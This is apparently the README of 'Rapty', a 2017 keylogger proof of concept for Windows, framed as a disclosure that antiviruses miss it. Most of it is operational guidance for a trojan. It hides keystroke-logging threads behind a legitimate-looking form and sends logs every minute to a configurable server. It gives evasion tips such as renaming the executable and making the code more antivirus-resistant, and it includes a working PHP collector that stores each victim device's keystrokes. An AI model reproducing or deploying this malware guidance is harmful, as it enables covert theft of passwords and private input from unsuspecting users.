Rapty is a keylogger PoC for Windows.

Today it works and it's hard to detect and today is *14 June 2017*.

# The article
You may read my article about it visiting the following sources:

- https://www.gitbook.com/book/aspie96/the-problem-with-rapty

The essence is that just by using Microsoft libraries I created a keylogger antiviruses do not detect.

# Description and usage
Use this sample **ON YOUR COMPUTERS ONLY! Do not you dare using this to anything that is illegal under your jurisdiction**.

The magic happens in the `Program.cs` file.

When the applications starts, after the form has been opened, two additional threads are started:

- The first one logs every key-press event (in this implementation, it cannot detect multiple keys being pressed at once, but it's really easy to modify it so that it does, according to your needs).
- The second one, once per every (about) one minute, sends the information to a server via `HTTP` or `HTTPS` (again, it should be possible to change this behavior to use other protocols, if needed and if antiviruses still don't detect it, but `HTTP` is absolutely fine for the purpose) and empties the local log (which is kept in memory and never ever stored to a file clientside).

Please note that those two threads are additional to the main one (there is a total of three threads going on) and that they are not [background threads](https://msdn.microsoft.com/library/system.threading.thread.isbackground(v=vs.110).aspx).

Also, they only start if no instance of the same application is already running (this is to prevent duplicated or inconsistent data being sent to the server).

Of course, it must look like a legit program and this is where `Form1` comes in.

`Form1` can contain an actual, legit simple one-form program.

Anything is fine, as long as it's simple and it's not a virus.

When the user runs the application, they see exactly what they were expecting and it runs perfectly fine, doing what it's supposed to (and what it's not supposed to, since it's a keylogger).

When the user wants to close the program, what they will actually do is closing just the window they see (`Form1`), without actually killing the process itself and, therefore, without ending the two malicious threads.

The program will stay open and just keep doing its thing until either the computer is switched off or the user just is lucky enough to find the process in the task manager and recognize it (which is really unlikely to happen).

## Collected data
Every minute, data is sent to the server trough `POST` requests.

If no keys have been pressed over the last minute, than no request is sent.

Five `POST` parameters are included:

- `serial`: A field identifying the single machine. This actually makes it possible for the server to keep multiple logs and, therefore, it makes this kelogger good not only for spying single users, but also a lot of them.
- `user`: The user's Windows username. Useful for telling apart different users sharing the same computer.
- `content`: The actual content of the log. This actually NEEDS to be a `POST` parameter since it maight be big. It is also one reason why it's a `POST` request in the first place.
- `random`: A [UUID](https://en.wikipedia.org/wiki/Universally_unique_identifier) which is unique for every logging session.
- `index`: The index of the current request in this session (it's `0` in the first request).

The main field is of course `content`.

This is provided in a very easy-to-read format (it's really straightforward both for humans and machines).

It is a CSV file where tab (`\t`) is used as a separator and CRLF (`\r\n`) is the line break (there is an empty line at the bottom).

Each line contains the timestamp of the logged key-press (UTC) and the actual name of the key which has been pressed.

## Configuration
The functionality to be included in `Form1` is entirely up to you, so here you'll just find how to configure the variables in `Program.cs`.

It's pretty straight-forward:

- `string host` is the complete URL of the resource all POST requests will be made to. It may contain GET parameters.
- `Key[] loggedKeys` is the array of keys you want to detect. Keep in mind that if two keys are pressed at the same time, this program will only see as pressed the first of the two it finds in the array.

That is pretty much it, but feel free to edit it more to accommodate your needs fully and make it more antivirus-resistant.

## Actually produce an executable
Two things you have to do to produce an actual program:

- Insert some actual functionality in `Form1`.
- Change a few variables in `Program.cs`.

And you are good to go.

I really recommend using my own project, instead of copy-pasting the code.

Remember that you must leave the references to `PresentationCore` and `WindowBasic` and you must build the project in Debug mode (that's right, do not use Release mode: keep reading to know why) for Any CPU.

The actual executable file should be renamed with a lowercase starting letter, so it's a bit more difficult to find in the task manager (if one is not looking for it). That is also the reason the name does not start with *A*.

## Serverside
Of course, you may use whatever language you want and whatever technique you want.

But, whatever you do, you will receive the four parameters described above, plus the IP address of the user (which gives you a lot of info, but is not usable for identification and that's where `serial` comes into place).

Here is the example of a simple PHP script to log user activity.

Notice how you also get other data, like the IP address of the victim.

```php
<?php
	$content = $_POST["content"];	// The actual content to be logged.
	$serial = $_POST["serial"];	// The user identifier.
	$ip = $_SERVER["HTTP_X_FORWARDED_FOR"];	// The user's IP address.
	// If needed:
	// $user = $_POST["user"];	// The user's username.
	// $index = $_POST["index"];	// Index of the request in current logging session.
	// $random = $_POST["random"];	// UUID: It is unique for logging session.

	file_put_contents("loggedKeys/keylogger-$serial.log", $content, FILE_APPEND);
?>

```

This will create, in the `loggedKeys` folder, a file for each device running the keylogger (not for each session, but for the individual device).

Here is an example of such a log file:

```
27/04/2017 12:57:46	RightShift
27/04/2017 12:57:46	T
27/04/2017 12:57:46	RightShift
27/04/2017 12:57:47	H
27/04/2017 12:57:47	E
27/04/2017 12:57:47	Space
27/04/2017 12:57:48	Q
27/04/2017 12:57:48	U
27/04/2017 12:57:48	I
27/04/2017 12:57:49	C
27/04/2017 12:57:49	K
27/04/2017 12:57:50	Space
27/04/2017 12:57:51	F
27/04/2017 12:57:51	O
27/04/2017 12:57:52	X
27/04/2017 12:57:52	Space
```

# The security problem
Of course, it's no secret and no joke that this is a big security problem.

Creating a perfectly working keylogger should not be so easy and avoid being detected by antivirus software should be even harder.

Checking on [VirusTotal](https://www.virustotal.com/it/file/62860daecb8b0978c9435aefc91c2e00403dd58ce8290cce01927169638dbeba/analysis/1497440390/), I found no antivirus able to detect this trojan.

The famous antiviruses are very much included in the list. Please, check if your antivirus is listed in the linked page. It's very, very likely.

If it is, know that it's entirely possible that this kind of keylogger is being used on you.



That is pretty scary, isn't it?



## What to do?

So, what should you do?

Four things, actually:

- Share this project and what I wrote about it. Make sure the problem is known, so people can pay attention to it and it will be solved earlier.
- Send a sample of this program to antivirus companies.
- Let Microsoft know the problem: the whole reason this even works are Microsoft libraries that basically let everyone create a keylogger for Windows computers. That should simply not be the case.
- Visit [this page](https://www.virustotal.com/it/file/62860daecb8b0978c9435aefc91c2e00403dd58ce8290cce01927169638dbeba/analysis/1497440390/) and downvote it (not really sure this one helps).

What you should **not** do is pretty obvious.

You shall not use Rapty for evil or illegal.

## Windows on-screen keyboard
Who's scared of keyloggers?

Afterall, all you have to do, is for writing you use an [on-screen keyboard](https://support.microsoft.com/help/10762/windows-use-on-screen-keyboard) when you are typing very sensitive data. Right?

Wrong! This keylogger, as many others, has really no problem whatsoever detecting keys pressed on the Windows on-screen keyboard.

### On-screen keyboards from antiviruses
Other on-screen keyboards may actually protect you, but still not entirely: even then, some keys may be detected.

If you are using Kaspersky, for instance, the following keys can still be detected:

- `LeftCtrl`
- `RightCtrl`
- `LeftShift`
- `RightShift`
- `LeftAlt`
- `RightAlt`
- `Back`
- `Return`
- `Home`
- `End`
- `Dlete`
- `PageUp`
- `PageDown`
- `Left`
- `Right`
- `Up`
- `Down`
- `Tab`
- `E` when you are typing the € sign.

Of course, there may be other keys to the list.

Please, notice that, even though this might not look like a lot, the timestamp of when each key is pressed is also recorded. Plus, very often partial infomation can still be useful and it's in no way similar to no information.

Ultimately, even if you are using an on-screen keyboard, you are not 100% safe.

# IsKeyDownOn4k
While creating this keylogger, which is, as far as I know, based on Microsoft Windows vulnerabilities, I also found this bug from Microsoft:
https://github.com/Aspie96/IsKeyDownOn4k

Talking about Rapty, it's user interface is messed up on 4K screens if you build in Release mode. But it's perfectly fine if you build in Debug mode.
